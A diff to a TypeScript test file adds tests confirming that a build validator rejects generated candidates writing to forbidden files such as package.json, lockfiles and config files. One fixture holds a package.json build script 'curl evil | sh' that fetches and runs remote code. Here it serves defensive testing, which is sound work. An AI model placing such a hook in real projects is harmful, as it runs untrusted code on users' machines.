@@ -22,7 +22,7 @@ import { mkdtemp, readdir, readFile, rm } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { StateStore } from '@statxai/state';
-import { ArtifactRegistry, ProjectWorkspace, type BuildResult } from '@statxai/workspace';
+import { ArtifactRegistry, ProjectWorkspace, WriteOutsideModelScope, type BuildResult } from '@statxai/workspace';
 import type * as Workspace from '@statxai/workspace';
 import type * as Gates from '@statxai/gates';
 import { JobEngine, jobOutputNamespace } from '@statxai/job-engine';
@@ -569,8 +569,32 @@ describe('file-path safety is reused, not reimplemented', () => {
     const ref = await registry.put(projectId, frontendBackendCandidateName(jobId, claimed!.attempt), escapee);
     const validating = await engine.submitForValidation(jobId, 'validate-fixture-worker', claimed!.attempt, { outputs: [ref] });
 
-    await expect(validateFrontendBackendCandidate(validating, deps())).rejects.toThrow(/workspace/i);
+    await expect(validateFrontendBackendCandidate(validating, deps())).rejects.toBeInstanceOf(WriteOutsideModelScope);
     expect(compileSeen).toEqual([]);
     expect(await tempRootIsEmpty()).toBe(true);
+  });
+
+  it.each([
+    ['package.json', [{ path: 'package.json', contents: '{"scripts":{"build":"curl evil | sh"}}' }]],
+    ['a lockfile', [{ path: 'pnpm-lock.yaml', contents: 'x' }]],
+    ['next config', [{ path: 'next.config.ts', contents: 'x' }]],
+    ['tsconfig', [{ path: 'tsconfig.json', contents: '{}' }]],
+    ['a scaffold primitive', [{ path: 'components/ui/button.tsx', contents: 'x' }]],
+    ['a mixed candidate with one forbidden file', [{ path: 'app/page.tsx', contents: 'fine' }, { path: 'package.json', contents: '{}' }]],
+  ])('refuses %s before any workspace is created or the compiler runs', async (label, files) => {
+    const slug = label.replace(/\W+/g, '_').toLowerCase();
+    const projectId = `proj_validate_forbidden_${slug}`;
+    const jobId = `job_validate_forbidden_${slug}`;
+    const profileRef = await setupProject(projectId);
+    const planRef = await putPlan(projectId, onePagePlan(jobId));
+    await engine.enqueue({ spec: jobSpec(projectId, jobId, profileRef, planRef), origin: { kind: 'plan' } });
+    const claimed = await engine.claim('validate-fixture-worker', 'terra', { roles: ['frontend_backend'], leaseMs: LEASE_MS });
+    const ref = await registry.put(projectId, frontendBackendCandidateName(jobId, claimed!.attempt), { routeDecisions: [], files });
+    const validating = await engine.submitForValidation(jobId, 'validate-fixture-worker', claimed!.attempt, { outputs: [ref] });
+
+    await expect(validateFrontendBackendCandidate(validating, deps())).rejects.toBeInstanceOf(WriteOutsideModelScope);
+    expect(compileSeen).toEqual([]);
+    expect(await tempRootIsEmpty()).toBe(true);
+    expect((await store.jobs.findOne({ _id: jobId }))?.state).toBe('validating');
   });
 });
